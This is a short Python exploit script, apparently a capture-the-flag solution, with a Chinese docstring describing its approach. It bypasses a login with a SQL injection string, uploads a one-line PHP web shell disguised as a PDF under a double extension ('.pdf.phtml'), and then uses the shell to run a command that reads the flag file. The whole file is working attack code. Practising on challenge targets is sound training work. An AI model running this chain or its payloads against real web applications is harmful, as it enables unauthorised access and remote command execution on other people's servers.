import requests
import sys

'''
@文件命名：X-029-24
@使用方式: python X-029-24.py url
@简述思路: 利用登录处 SQL 注入绕过，上传 .pdf.phtml WebShell 后执行命令读取 FLAG。
'''


def Scan(url):
    s = requests.Session()
    s.post(url + "/index.php", data={"username": "a' UNION SELECT ''' OR 1=1 -- -", "password": "x", "submit": "submit"})
    php = "<?php system($_GET['c']); ?>"
    s.post(url + "/upload.php", files={"invoice": ("rce.pdf.phtml", php, "application/pdf")})
    r = s.get(url + "/uploaded_invoices/rce.pdf.phtml", params={"c": "cat /FLAG.txt"})
    return r.text


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
